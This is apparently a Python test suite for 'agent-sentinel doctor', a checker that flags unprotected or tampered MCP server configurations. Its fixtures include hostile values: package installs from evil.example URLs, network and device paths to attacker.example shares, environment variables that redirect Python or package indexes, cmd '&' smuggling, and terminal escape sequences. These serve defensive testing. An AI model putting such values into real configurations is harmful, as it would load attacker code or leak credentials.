"""`agent-sentinel doctor` (agent_sentinel/cli_doctor.py), on fixture configurations only.

Every test runs with HOME, USERPROFILE, APPDATA, LOCALAPPDATA and the current
folder inside a temporary folder (IsolatedHomeTest): doctor never reads the
real client configurations of the person running the tests.
"""

import contextlib
import json
import os
import sys
import unittest
from unittest import mock

from cli_support import IsolatedHomeTest, run_cli
from agent_sentinel import __version__, cli_doctor, clients, templates

TOKEN = "ghp_abcdefghijklmnopqrstuvwxyz0123456789"


@contextlib.contextmanager
def no_look_at(marker):
    """Record every look at a path that holds `marker`, and answer it without a real look.

    The real function never sees such a path: on Windows, a real look at a
    network path would try to sign in to that machine.
    """
    looked_at = []
    answers = {"isfile": False, "isdir": False, "exists": False, "getsize": OSError, "samefile": OSError}

    def spy(real, answer):
        def look(*args, **kwargs):
            if any(marker in str(arg) for arg in args):
                looked_at.append(" ".join(str(arg) for arg in args))
                if answer is OSError:
                    raise FileNotFoundError(args[0])
                return answer
            return real(*args, **kwargs)
        return look

    with contextlib.ExitStack() as stack:
        for name, answer in answers.items():
            stack.enter_context(mock.patch.object(os.path, name, spy(getattr(os.path, name), answer)))
        for name, answer in (("stat", OSError), ("lstat", OSError), ("access", False)):
            stack.enter_context(mock.patch.object(os, name, spy(getattr(os, name), answer)))
        yield looked_at


class DoctorTest(IsolatedHomeTest):
    def setUp(self):
        super().setUp()
        check = mock.patch("agent_sentinel.cli_doctor.installed_version", return_value=__version__)
        self.installed_version = check.start()
        self.addCleanup(check.stop)
        self.home.mkdir()
        (self.home / "pins").mkdir()
        self.policy = self.write("user/.agent-sentinel/policy.json", templates.template("starter"))

    def wrapped(self, name, *extra, policy=None, pins=None, audit=None, server=None):
        """A wrapped entry as `wrap` writes it, starting this Python as the 'server'."""
        args = ["-I", "-m", "agent_sentinel", "proxy"]
        args += ["--policy", str(policy or self.policy)] if policy != "" else []
        args += ["--audit", str(audit or self.home / "audit.jsonl")] if audit != "" else []
        args += ["--pins", str(pins or self.home / "pins" / f"{name}.json")] if pins != "" else []
        args += ["--name", name, *extra, "--", *(server or [sys.executable, "server.py"])]
        return {"command": sys.executable, "args": args}

    def config(self, servers, name="servers.json"):
        return self.write(name, {"mcpServers": servers})

    def doctor(self, *paths, json_output=False):
        args = ["doctor"]
        for path in paths:
            args += ["--config", str(path)]
        if json_output:
            args += ["--format", "json"]
        return run_cli(*args)

    def statuses(self, *paths):
        code, out, err = self.doctor(*paths, json_output=True)
        report = json.loads(out)
        return code, {server["name"]: server for config in report["configs"] for server in config["servers"]}, report


class Classification(DoctorTest):
    def test_every_server_is_protected_unprotected_remote_or_broken(self):
        path = self.config({
            "good": self.wrapped("good"),
            "plain": {"command": "npx", "args": ["-y", "some-server@1.0.0"]},
            "remote": {"url": "https://example.com/mcp"},
            "nothing": {"args": ["x"]},
            "relative": self.wrapped("relative", policy="policy.json"),
            "watching": self.wrapped("watching", "--monitor"),
        })
        code, servers, report = self.statuses(path)
        self.assertEqual(code, 1)
        self.assertEqual({name: server["status"] for name, server in servers.items()}, {
            "good": "protected", "plain": "unprotected", "remote": "remote", "nothing": "broken",
            "relative": "broken", "watching": "unprotected",
        })
        self.assertEqual(report["summary"], {"protected": 1, "unprotected": 2, "remote": 1, "broken": 2})
        self.assertEqual(report["exit_code"], 1)

    def test_all_protected_exits_0(self):
        code, out, err = self.doctor(self.config({"good": self.wrapped("good"), "remote": {"url": "https://x/mcp"}}))
        self.assertEqual(code, 0, out + err)
        self.assertRegex(out, r"\[ok\]\s+good\s+protected:")
        self.assertRegex(out, r"\[warn\]\s+remote\s+NOT protected: a remote server")
        self.assertIn("Summary: 1 protected, 0 NOT protected, 1 remote (cannot be protected), 0 broken.", out)

    def test_an_unprotected_server_gets_the_fix(self):
        path = self.write("project/.mcp.json", {"mcpServers": {"plain": {"command": "npx", "args": ["x@1.0.0"]}}})
        code, out, _ = self.doctor(path)
        self.assertEqual(code, 1)
        self.assertIn("NOT protected: starts npx x@1.0.0 directly. "
                      "To fix: agent-sentinel wrap --client claude-code", out)
        self.assertIn("Exit code 1: see the [fail] lines.", out)

    def test_monitor_mode_is_not_protection(self):
        code, out, _ = self.doctor(self.config({"watching": self.wrapped("watching", "--monitor")}))
        self.assertEqual(code, 1)
        self.assertIn("NOT protected: monitor mode (--monitor)", out)


class WhyAServerIsBroken(DoctorTest):
    def reasons(self, entry):
        _, servers, _ = self.statuses(self.config({"s": entry}))
        server = servers["s"]
        return server["status"], " | ".join(finding["text"] for finding in server["findings"])

    def test_policy_problems(self):
        for entry, expected in (
            (self.wrapped("s", policy=""), "no --policy, so the proxy will not start"),
            (self.wrapped("s", policy="relative.json"), "is relative: the client starts the proxy in a folder"),
            (self.wrapped("s", policy=self.folder / "missing.json"), "there is no policy file at"),
        ):
            with self.subTest(expected=expected):
                status, text = self.reasons(entry)
                self.assertEqual(status, "broken")
                self.assertIn(expected, text)

    def test_a_policy_that_does_not_load(self):
        bad = self.write("bad.json", {"default": "maybe"})
        code, out, _ = self.doctor(self.config({"s": self.wrapped("s", policy=bad)}))
        self.assertEqual(code, 1)
        self.assertIn("the policy does not load, so the proxy will not start", out)
        self.assertRegex(out, r"\[fail\]\s+.*bad\.json.*default must be")

    def test_commands_that_cannot_start(self):
        status, text = self.reasons(self.wrapped("s", server=["no-such-server-command-anywhere"]))
        self.assertEqual(status, "broken")
        self.assertIn("is not on this terminal's PATH", text)
        status, text = self.reasons({"command": str(self.folder / "missing" / "python.exe"),
                                     "args": ["-m", "agent_sentinel", "proxy", "--policy", str(self.policy),
                                              "--", "x"]})
        self.assertIn("the program that starts the proxy", text)
        status, text = self.reasons({"command": sys.executable, "args": ["-m", "agent_sentinel", "proxy", "--policy",
                                                                         str(self.policy)]})
        self.assertEqual(status, "broken")
        self.assertIn("no server command after '--'", text)

    def test_a_shortened_proxy_option_is_broken_not_protected(self):
        weak = self.write("weak.json", {"default": "allow"})
        for extra, expected in ((["--mon"], "'--mon' is a shortened --monitor"),
                                (["--polic", str(weak)], "'--polic' is a shortened --policy"),
                                ([f"--polic={weak}"], "is a shortened --policy")):
            with self.subTest(extra=extra):
                code, servers, _ = self.statuses(self.config({"s": self.wrapped("s", *extra)}))
                self.assertEqual(code, 1)
                self.assertEqual(servers["s"]["status"], "broken")
                texts = " | ".join(finding["text"] for finding in servers["s"]["findings"])
                self.assertIn(expected, texts)
                self.assertNotIn("protected:", texts)

    def test_a_policy_given_twice_is_broken(self):
        weak = self.write("weak.json", {"default": "allow"})
        status, text = self.reasons(self.wrapped("s", "--policy", str(weak)))
        self.assertEqual(status, "broken")
        self.assertIn("--policy is given more than once", text)

    def test_a_command_that_runs_something_before_the_proxy_is_not_protected(self):
        entry = self.wrapped("np")
        for before in (["/c", "python", "evil.py", "&"], ["evil.js"]):
            words = [*before, "agent-sentinel", *entry["args"][3:]]  # ... agent-sentinel proxy --policy ...
            with self.subTest(before=before):
                code, servers, _ = self.statuses(self.config({"np": {"command": "cmd.exe", "args": words}}))
                self.assertEqual(code, 1)
                self.assertEqual(servers["np"]["status"], "broken")
                self.assertIn("starts the proxy only after other words", servers["np"]["findings"][0]["text"])

    def test_a_package_runner_that_installs_from_a_url_or_a_path_is_not_protected(self):
        # Each of these installs whatever is at that place under the name agent-sentinel, and runs it.
        entry = self.wrapped("s")
        proxy_words = entry["args"][3:]  # proxy --policy ...
        for launcher in (["uvx", "agent-sentinel@git+https://evil.example/x"],
                         ["uvx", "--from", "agent-sentinel@file:///C:/Users/Public/evil", "agent-sentinel"],
                         ["pipx", "run", "--spec", "agent-sentinel@ git+https://evil.example/x", "agent-sentinel"],
                         ["pipx", "run", "agent-sentinel@https://evil.example/x.whl"],
                         # Not versions: uv installs from a folder of that name in the folder the client starts it in.
                         ["uvx", "agent-sentinel@0.5.0-evil"], ["uvx", "agent-sentinel@1.zip"],
                         ["uvx", "--from", "agent-sentinel@1x", "agent-sentinel"],
                         ["uv", "tool", "run", "agent-sentinel@0.5.0-local"]):
            with self.subTest(launcher=launcher):
                code, servers, _ = self.statuses(self.config({"s": {"command": launcher[0],
                                                                    "args": [*launcher[1:], *proxy_words]}}))
                self.assertEqual(code, 1)
                self.assertEqual(servers["s"]["status"], "broken")
                self.assertIn("from a package that is not agent-sentinel at a version",
                              servers["s"]["findings"][0]["text"])

    def test_an_option_value_the_proxy_refuses_is_broken(self):
        for extra, expected in (
            (["--max-message-bytes", "2147483648"], "--max-message-bytes '2147483648' (must be 1 to 1073741824 bytes)"),
            (["--max-message-bytes=0"], "--max-message-bytes '0'"),
            (["--max-message-bytes", "abc"], "must be a whole number of bytes"),
            (["--approval-timeout", "abc"], "must be a whole number of seconds"),
            (["--approval-timeout", "0"], "--approval-timeout '0'"),
            (["--tool-names", "loud"], "--tool-names 'loud' (choose from strict, warn, off)"),
            (["--pass-env", "*"], "'*' would pass every variable"),
            (["--approve-with", "telepathy"], "unknown approver"),
            (["--approve-with", "command:relative/approve"], "is a relative path"),
            (["--approve-with", "dialog", "--approve-with", "dialog"], "--approve-with dialog is given twice"),
            (["--elicitation-host", "localhost"], "the proxy will not start: it cannot use --elicitation-host"),
            (["--quiet", "--verbose"], "--quiet and --verbose are both given"),
        ):
            with self.subTest(extra=extra):
                code, servers, _ = self.statuses(self.config({"s": self.wrapped("s", *extra)}))
                self.assertEqual(code, 1)
                self.assertEqual(servers["s"]["status"], "broken")
                texts = " | ".join(finding["text"] for finding in servers["s"]["findings"])
                self.assertIn(expected, texts)
                self.assertNotIn("protected:", texts)
        # The proxy checks every --name it is given, not only the last.
        status, text = self.reasons(self.wrapped("bad name!", "--name", "good"))
        self.assertEqual(status, "broken")
        self.assertIn("the proxy refuses the --name 'bad name!'", text)

    def test_option_values_the_proxy_takes_are_fine(self):
        extra = ["--max-message-bytes", "1073741824", "--approval-timeout", "60", "--tool-names", "strict",
                 "--pass-env", "GITHUB_*", "--approve-with", "dialog", "--approve-with", "elicitation",
                 "--approve-with", f"command:{sys.executable}", "--elicitation-host", "*.example.com", "--quiet"]
        status, text = self.reasons(self.wrapped("s", *extra))
        self.assertEqual(status, "protected", text)

    @unittest.skipUnless(sys.platform == "win32", "network paths of this form are a Windows matter")
    def test_an_approver_on_another_machine_is_never_looked_at(self):
        looked_at = []
        real = {name: getattr(os.path, name) for name in ("isfile", "isdir", "exists", "getsize")}

        def spy(name):
            def look(path, *args, **kwargs):
                looked_at.append(str(path))
                return real[name](path, *args, **kwargs)
            return look

        entry = self.wrapped("s", "--approve-with", r"command:\\attacker.example\share\approve.exe")
        with mock.patch.multiple(os.path, **{name: spy(name) for name in real}):
            status, text = self.reasons(entry)
        self.assertEqual([path for path in looked_at if "attacker" in path], [])
        self.assertEqual(status, "broken")
        self.assertIn("is on another machine; doctor does not open network paths", text)

    def test_a_python_without_agent_sentinel_cannot_start_the_proxy(self):
        self.installed_version.return_value = None
        status, text = self.reasons(self.wrapped("s"))
        self.assertEqual(status, "broken")
        self.assertIn("cannot import agent_sentinel", text)
        self.installed_version.return_value = "0.0.1"
        status, text = self.reasons(self.wrapped("s"))
        self.assertEqual(status, "protected")
        self.assertIn("runs agent-sentinel 0.0.1", text)

    def test_a_program_named_in_a_configuration_is_never_run(self):
        # A checked-in .mcp.json could name any program as "the Python that starts the proxy".
        program = self.write("other/python.exe", "MZ")  # named like a Python, and not the one running doctor
        entry = {"command": str(program), "args": ["-m", "agent_sentinel", "proxy", "--policy", str(self.policy),
                                                   "--", sys.executable, "server.py"]}
        status, _ = self.reasons(entry)
        self.installed_version.assert_not_called()
        self.assertEqual(status, "protected")
        self.reasons(self.wrapped("s"))  # the Python running doctor is checked, the way the entry starts it
        self.installed_version.assert_called_once_with(sys.executable, True)

    def test_a_python_started_without_isolation_is_a_warning(self):
        entry = self.wrapped("s")
        entry["args"].remove("-I")
        status, text = self.reasons(entry)
        self.assertEqual(status, "protected")
        self.assertIn("Python is started without -I, so a folder named agent_sentinel", text)
        self.installed_version.assert_called_with(sys.executable, False)
        self.installed_version.return_value = None
        status, text = self.reasons(self.wrapped("s"))
        self.assertEqual(status, "broken")
        self.assertIn("started with -I cannot import agent_sentinel", text)

    @unittest.skipUnless(sys.platform == "win32", "network paths of this form are a Windows matter")
    def test_a_path_on_another_machine_is_never_looked_at(self):
        looked_at = []
        real = {name: getattr(os.path, name) for name in ("isfile", "isdir", "exists", "getsize")}

        def spy(name):
            def look(path, *args, **kwargs):
                looked_at.append(str(path))
                return real[name](path, *args, **kwargs)
            return look

        share = r"\\attacker.example\share"
        entry = self.wrapped("s", policy=share + r"\policy.json", pins=share + r"\pins.json",
                             audit="//attacker.example/share/audit.jsonl")
        launched = {"command": share + r"\python.exe", "args": entry["args"]}
        with mock.patch.multiple(os.path, **{name: spy(name) for name in real}):
            _, servers, _ = self.statuses(self.config({"s": entry, "t": launched}))
        self.assertEqual([path for path in looked_at if "attacker" in path], [])
        texts = " | ".join(finding["text"] for finding in servers["s"]["findings"])
        self.assertEqual(servers["s"]["status"], "broken")
        self.assertIn("is on another machine; doctor does not open network paths", texts)
        self.assertIn("the pins file", texts)
        self.assertIn("the audit log", texts)
        self.assertIn("the program that starts the proxy", " ".join(
            finding["text"] for finding in servers["t"]["findings"]))

    @unittest.skipUnless(sys.platform == "win32", "device paths are a Windows matter")
    def test_a_device_path_is_never_looked_at(self):
        # \??\UNC\server\share is a network path too, and Python before 3.13 takes \??\... for a full path.
        share = r"\??\UNC\attacker.example\share"
        entry = self.wrapped(
            "s", "--env-file", share + r"\server.env",
            *(word for program in (share + r"\approve.exe", r"\\?\UNC\attacker.example\share\a.exe",
                                   "//?/UNC/attacker.example/share/a.exe", r"\\.\UNC\attacker.example\share\a.exe",
                                   "/??/UNC/attacker.example/share/a.exe")
              for word in ("--approve-with", "command:" + program)),
            policy=share + r"\policy.json", pins=r"\\?\UNC\attacker.example\share\pins.json",
            audit="//./UNC/attacker.example/share/audit.jsonl", server=[share + r"\server.exe"])
        launched = {"command": share + r"\python.exe", "args": entry["args"]}
        with no_look_at("attacker.example") as looked_at:
            _, servers, _ = self.statuses(self.config({"s": entry, "t": launched}))
        self.assertEqual(looked_at, [])
        texts = [finding["text"] for finding in servers["s"]["findings"]]
        self.assertEqual(servers["s"]["status"], "broken")
        self.assertEqual(len([text for text in texts if text.startswith("the approver")
                              and "is a device path" in text]), 5, texts)
        for what in ("the policy", "the pins file", "the audit log", "the env file"):
            self.assertTrue([text for text in texts if text.startswith(what) and "is a device path" in text], what)
        self.assertIn("is a device path", " ".join(finding["text"] for finding in servers["t"]["findings"]))

    def test_files_named_in_a_configuration_are_read_only_when_ordinary_and_small(self):
        status, text = self.reasons(self.wrapped("s", pins=self.home))
        self.assertEqual(status, "broken")
        self.assertIn("is not an ordinary pins file", text)
        pins = self.write("user/.agent-sentinel/pins/big.json", {"version": 1, "tools": {}})
        with mock.patch.object(cli_doctor, "MAX_CHECKED_FILE_BYTES", 5):
            status, text = self.reasons(self.wrapped("s", pins=pins))
            self.assertIn("is not an ordinary pins file", text)
            status, text = self.reasons(self.wrapped("s"))
            self.assertIn("is larger than 5 bytes, which no policy is", text)
        self.assertEqual(status, "broken")

    def test_an_env_file_the_proxy_cannot_use_is_broken(self):
        good = self.write("user/.agent-sentinel/server.env", "API_KEY=hunter22-value\n")
        bad = self.write("user/.agent-sentinel/bad.env", "export API_KEY=hunter22-value\n")
        for env_file, expected in ((self.folder / "missing.env", "there is no env file at"),
                                   ("server.env", "the env file path 'server.env' is relative"),
                                   (self.home, "there is no env file at"),
                                   (bad, "the proxy cannot use the env file, so it will not start")):
            with self.subTest(env_file=env_file):
                status, text = self.reasons(self.wrapped("s", "--env-file", str(env_file)))
                self.assertEqual(status, "broken")
                self.assertIn(expected, text)
                self.assertNotIn("hunter22", text)
        for given in (["--env-file", str(good)], ["--env-file="]):  # an empty value: no env file, to the proxy too
            status, text = self.reasons(self.wrapped("s", *given))
            self.assertEqual(status, "protected", text)

    def test_env_that_changes_what_starts_as_the_proxy_is_broken(self):
        # The client starts the launcher with the entry's "env", not only the server behind it.
        uvx, pipx, script, py = (self.write(f"bin/{name}.exe", "MZ") for name in ("uvx", "pipx", "agent-sentinel", "py"))
        tail = self.wrapped("s")["args"][3:]  # proxy --policy ...
        for launcher, env, expected in (
            ([sys.executable, "-I", "-m", "agent_sentinel"], {"__PYVENV_LAUNCHER__": r"evil\Scripts\python.exe"},
             "Python takes its own program file from it, even with -I"),
            ([sys.executable, "-m", "agent_sentinel"], {"PYTHONPATH": "evil"},
             "a Python started without -I imports from the folders it names"),
            ([sys.executable, "-m", "agent_sentinel"], {"APPDATA": "evil"},
             "a Python started without -I finds the user's own site-packages"),
            ([str(script)], {"PYTHONHOME": "evil"}, "a Python started without -I imports from the folders it names"),
            (["agent-sentinel"], {"PATH": "evil-bin"}, "the client looks up the program that starts the proxy"),
            ([str(py), "-3.12", "-I", "-m", "agent_sentinel"], {"VIRTUAL_ENV": "evil"},
             "the py launcher may start another Python"),
            ([str(uvx), "agent-sentinel==0.5.0"], {"UV_INDEX_URL": "https://evil.example/simple"},
             "the package runner may get agent-sentinel from another index or folder"),
            ([str(uvx), "agent-sentinel==0.5.0"], {"PYTHONPATH": "evil"},  # the runner starts Python without -I
             "a Python started without -I imports from the folders it names"),
            ([str(pipx), "run", "--spec", "agent-sentinel==0.5.0", "agent-sentinel"],
             {"PIP_INDEX_URL": "https://evil.example/simple"}, "the package runner may get agent-sentinel"),
        ):
            with self.subTest(launcher=launcher, env=env):
                status, text = self.reasons({"command": launcher[0], "args": [*launcher[1:], *tail], "env": env})
                self.assertEqual(status, "broken")
                self.assertIn(f"the entry's \"env\" sets {next(iter(env))}; with that, {expected}", text)
                self.assertNotIn("protected:", text)
        # Variables that change nothing for that launcher, and one set to the value it has here.
        for launcher, env in (([sys.executable, "-I", "-m", "agent_sentinel"], {"PYTHONPATH": "x", "APPDATA": "y"}),
                              ([str(uvx), "agent-sentinel==0.5.0"], {"UV_NO_CONFIG": "1", "PYTHONUNBUFFERED": "1"}),
                              ([sys.executable, "-m", "agent_sentinel"], {"APPDATA": os.environ["APPDATA"]})):
            with self.subTest(launcher=launcher, env=env):
                status, text = self.reasons({"command": launcher[0], "args": [*launcher[1:], *tail], "env": env})
                self.assertEqual(status, "protected", text)

    def test_a_pins_file_the_proxy_cannot_read(self):
        pins = self.write("user/.agent-sentinel/pins/s.json", "not json")
        status, text = self.reasons(self.wrapped("s", pins=pins))
        self.assertEqual(status, "broken")
        self.assertIn("the pins file cannot be read, so the proxy will not start", text)

    def test_a_name_the_proxy_refuses(self):
        status, text = self.reasons(self.wrapped("bad name!"))
        self.assertEqual(status, "broken")
        self.assertIn("the proxy refuses the --name", text)

    @unittest.skipUnless(sys.platform == "win32", "batch files are a Windows matter")
    def test_a_batch_file_argument_cmd_would_change(self):
        launcher = self.write("server.cmd", "@echo off\r\n")
        status, text = self.reasons(self.wrapped("s", server=[str(launcher), "a&b"]))
        self.assertEqual(status, "broken")
        self.assertIn("cmd.exe would change it", text)


class Warnings(DoctorTest):
    def findings(self, entry, config_name="servers.json"):
        _, servers, _ = self.statuses(self.config({"s": entry}, config_name))
        return [(finding["level"], finding["text"]) for finding in servers["s"]["findings"]]

    def test_missing_or_relative_audit_and_pins_and_name(self):
        entry = self.wrapped("s", audit="", pins="")
        entry["args"].remove("--name")
        entry["args"].remove("s")
        texts = " | ".join(text for level, text in self.findings(entry) if level == "warn")
        self.assertIn("no --audit", texts)
        self.assertIn("no --pins", texts)
        self.assertIn("no --name", texts)
        texts = " | ".join(text for _, text in self.findings(self.wrapped("s", audit="a.jsonl", pins="p.json")))
        self.assertIn("the audit path 'a.jsonl' is relative", texts)
        self.assertIn("the pins path 'p.json' is relative", texts)

    def test_folders_that_do_not_exist(self):
        entry = self.wrapped("s", audit=self.folder / "gone" / "audit.jsonl", pins=self.folder / "gone" / "p.json")
        texts = " | ".join(text for _, text in self.findings(entry))
        self.assertIn("the audit log's folder", texts)
        self.assertIn("the pins file's folder", texts)

    def test_servers_sharing_a_pins_file(self):
        shared = self.home / "pins" / "same.json"
        path = self.config({"a": self.wrapped("a", pins=shared), "b": self.wrapped("b", pins=shared)})
        code, out, _ = self.doctor(path)
        self.assertEqual(code, 0)
        self.assertIn("2 servers share the pins file", out)
        report = json.loads(self.doctor(path, json_output=True)[1])
        self.assertEqual(len(report["shared_pins"]), 1)

    def test_unknown_proxy_options_and_no_pins(self):
        texts = " | ".join(text for _, text in self.findings(self.wrapped("s", "--frobnicate", "--no-pins")))
        self.assertIn("'--frobnicate' is not one this version knows", texts)
        self.assertIn("--no-pins", texts)

    def test_clean_env_without_pass_env(self):
        entry = self.wrapped("s", "--clean-env", "--pass-env", "A")
        entry["env"] = {"A": "1", "B": "2"}
        texts = " | ".join(text for _, text in self.findings(entry))
        self.assertIn("--clean-env without --pass-env for B", texts)

    def test_files_inside_the_project_folder(self):
        policy = self.write("project/policy.json", templates.template("readonly"))
        path = self.write("project/.mcp.json", {"mcpServers": {"s": self.wrapped("s", policy=policy)}})
        code, out, _ = self.doctor(path)
        self.assertIn("the policy is inside the project folder", out)


class PackagesAndSecrets(DoctorTest):
    def test_unpinned_packages(self):
        cases = {
            ("npx", "-y", "@modelcontextprotocol/server-filesystem", "/w"): "@modelcontextprotocol/server-filesystem",
            ("npx", "pkg@latest"): "pkg@latest",
            ("npx", "--yes", "pkg@^1.2.0"): "pkg@^1.2.0",
            ("npx.cmd", "-p", "pkg", "run-it"): "pkg",
            ("C:/nodejs/npx", "--package=tool", "x"): "tool",
            ("uvx", "mcp-server-fetch"): "mcp-server-fetch",
            ("uvx", "--python", "3.12", "mcp-server-git>=1.0"): "mcp-server-git>=1.0",
            ("uvx", "--from", "pkg", "cmd"): "pkg",
            ("uv", "tool", "run", "pkg"): "pkg",
        }
        for words, package in cases.items():
            with self.subTest(words=words):
                self.assertEqual(cli_doctor.unpinned_package(list(words))[0], package)
        for words in (("npx", "-y", "@scope/pkg@1.2.3"), ("npx", "pkg@1.2.3-beta.1"), ("uvx", "pkg==1.2.3"),
                      ("uvx", "pkg@1.2.3"), ("uvx", "--from", "pkg==0.6.2", "pkg"), ("npx", "./local/server"),
                      ("npx", "github:user/repo"), ("uvx", "git+https://x/y"), ("node", "server.js"),
                      ("npx",), ("npx", "-y"), ("uvx", "--from")):
            with self.subTest(words=words):
                self.assertIsNone(cli_doctor.unpinned_package(list(words)))

    def test_an_unpinned_package_is_a_warning_with_the_fix(self):
        code, out, _ = self.doctor(self.config({"s": self.wrapped("s", server=["npx", "-y", "some-mcp"])}))
        self.assertIn("the package 'some-mcp' is not pinned to an exact version", out)
        self.assertIn("for example some-mcp@1.2.3", out)

    def test_secret_names_are_shown_and_values_never(self):
        entry = {"command": "npx", "args": ["x@1.0.0", "--token", TOKEN],
                 "env": {"GITHUB_TOKEN": "hunter22-value", "PLAIN": TOKEN, "LOG_LEVEL": "debug"}}
        code, out, err = self.doctor(self.config({"s": entry}))
        self.assertIn("env holds GITHUB_TOKEN, PLAIN in plain text in this file (values not shown)", out)
        self.assertIn("an argument holds what looks like a GitHub token", out)
        self.assertNotIn(TOKEN, out + err)
        self.assertNotIn("hunter22", out + err)
        self.assertNotIn("LOG_LEVEL", out)
        _, out, _ = self.doctor(self.config({"s": entry}), json_output=True)
        self.assertNotIn(TOKEN, out)
        self.assertNotIn("hunter22", out)

    def test_secret_looking_names_are_found_by_word(self):
        for name in ("GITHUB_TOKEN", "OPENAI_API_KEY", "apiKey", "X-Auth-Token", "DB_PASSWORD", "MYSQL_PWD",
                     "SENTRY_DSN", "AWS_SECRET_ACCESS_KEY", "Authorization", "GITLAB_PAT"):
            with self.subTest(name=name):
                self.assertTrue(cli_doctor.looks_secret(name))
        for name in ("AUTHOR", "MONKEY_COUNT", "LOG_LEVEL", "PATH", "KEYBOARD_LAYOUT", "TOKENIZER_MODEL"):
            with self.subTest(name=name):
                self.assertFalse(cli_doctor.looks_secret(name))

    def test_a_secret_word_with_a_digit_attached_is_still_a_secret_word(self):
        for name in ("GITHUB_TOKEN2", "API_KEY2", "apiKey2", "accessToken2", "Secret2", "KEY2_ID", "token1"):
            with self.subTest(name=name):
                self.assertTrue(cli_doctor.looks_secret(name))
        for name in ("OAUTH2_CLIENT_ID", "S3_BUCKET", "HTTP2_ENABLED", "PATH2", "MONKEY2"):
            with self.subTest(name=name):
                self.assertFalse(cli_doctor.looks_secret(name))
        # An opaque password has no recognisable format: only its name gives it away.
        entry = {"command": "npx", "args": ["x@1.0.0"], "env": {"GITHUB_TOKEN2": "hunter22-a", "API_KEY2": "b",
                                                                "apiKey2": "c", "LOG_LEVEL": "debug"}}
        _, out, _ = self.doctor(self.config({"s": entry}))
        self.assertIn("env holds GITHUB_TOKEN2, API_KEY2, apiKey2 in plain text in this file (values not shown)", out)
        self.assertNotIn("hunter22", out)

    def test_remote_headers_are_named_not_shown(self):
        entry = {"url": "https://x/mcp", "headers": {"Authorization": "Bearer hunter22-value"}}
        _, out, _ = self.doctor(self.config({"s": entry}))
        self.assertIn("headers holds Authorization in plain text", out)
        self.assertNotIn("hunter22", out)


class Files(DoctorTest):
    def test_configurations_found_by_clients_are_checked(self):
        config = clients.desktop_locations(os.environ, sys.platform)[0].path
        config.parent.mkdir(parents=True)
        config.write_text(json.dumps({"mcpServers": {"good": self.wrapped("good")}}), encoding="utf-8")
        (config.parent / "Claude Extensions" / "ant.dir.x").mkdir(parents=True)
        code, out, err = run_cli("doctor")
        self.assertEqual(code, 0, out + err)
        self.assertIn("Claude Desktop:", out)
        self.assertIn("1 Desktop Extension(s), which cannot be wrapped, so NOT protected: ant.dir.x", out)
        self.assertIn("Policies:", out)

    def test_nothing_found_is_not_a_failure(self):
        code, out, _ = run_cli("doctor")
        self.assertEqual(code, 0)
        self.assertIn("No MCP client configuration was found.", out)

    def test_a_configuration_that_cannot_be_read_fails(self):
        code, out, _ = self.doctor(self.write("bad.json", "{ // comment\n}"))
        self.assertEqual(code, 1)
        self.assertIn("cannot be read:", out)
        code, out, _ = self.doctor(self.write("list.json", {"mcpServers": ["x"]}))
        self.assertEqual(code, 1)

    def test_a_config_file_that_does_not_exist_is_a_usage_error(self):
        code, _, err = self.doctor(self.folder / "missing.json")
        self.assertEqual(code, 2)
        self.assertIn("there is no file at", err)

    def test_a_leading_tilde_is_the_home_folder(self):
        # Windows PowerShell 5.1 and cmd pass "~" on as it is.
        self.write("user/servers.json", {"mcpServers": {"good": self.wrapped("good")}})
        code, servers, report = self.statuses("~/servers.json")
        self.assertEqual(code, 0)
        self.assertEqual(servers["good"]["status"], "protected")
        self.assertEqual(report["configs"][0]["path"], str(self.user / "servers.json"))

    def test_a_leading_tilde_in_the_proxys_files_is_the_home_folder(self):
        # The proxy reads "~" in --policy, --audit, --pins, --env-file and --approve-with command: as the home folder.
        self.write("user/.agent-sentinel/server.env", "LOG_LEVEL=debug\n")
        approve = self.write("user/bin/approve.exe", "MZ")
        approve.chmod(0o755)
        entry = self.wrapped("s", "--env-file", "~/.agent-sentinel/server.env",
                             "--approve-with", "command:~/bin/approve.exe", policy="~/.agent-sentinel/policy.json",
                             pins="~/.agent-sentinel/pins/s.json", audit="~/.agent-sentinel/audit.jsonl")
        code, servers, _ = self.statuses(self.config({"s": entry}))
        texts = " | ".join(finding["text"] for finding in servers["s"]["findings"])
        self.assertEqual((code, servers["s"]["status"]), (0, "protected"), texts)
        self.assertNotIn("relative", texts)
        self.assertEqual(servers["s"]["policy"], str(self.policy))
        self.assertEqual(servers["s"]["pins"], str(self.home / "pins" / "s.json"))
        self.assertEqual(servers["s"]["audit"], str(self.home / "audit.jsonl"))
        self.assertFalse((self.folder / "~").exists())

    def test_vscode_files_use_their_own_key(self):
        path = self.write("project/.vscode/mcp.json", {"servers": {"s": {"type": "stdio", "command": "npx",
                                                                          "args": ["x@1.0.0"]}}})
        _, servers, report = self.statuses(path)
        self.assertEqual(servers["s"]["status"], "unprotected")
        self.assertEqual(report["configs"][0]["client"], "vscode")
        self.assertEqual(report["configs"][0]["scope"], "project")

    def test_hostile_text_is_printed_safely(self):
        entry = {"command": "npx\x1b[2J", "args": ["x\x07"], "env": {"TOKEN\x1b]0;x\x07": "v"}}
        for json_output in (False, True):
            _, out, _ = self.doctor(self.config({"evil\x1b[31m": entry}), json_output=json_output)
            self.assertNotIn("\x1b", out)
            self.assertNotIn("\x07", out)

    def test_doctor_writes_nothing(self):
        path = self.config({"good": self.wrapped("good"), "plain": {"command": "npx"}})
        before = sorted(str(entry) for entry in self.folder.rglob("*"))
        self.doctor(path)
        self.doctor(path, json_output=True)
        self.assertEqual(sorted(str(entry) for entry in self.folder.rglob("*")), before)


if __name__ == "__main__":
    unittest.main()
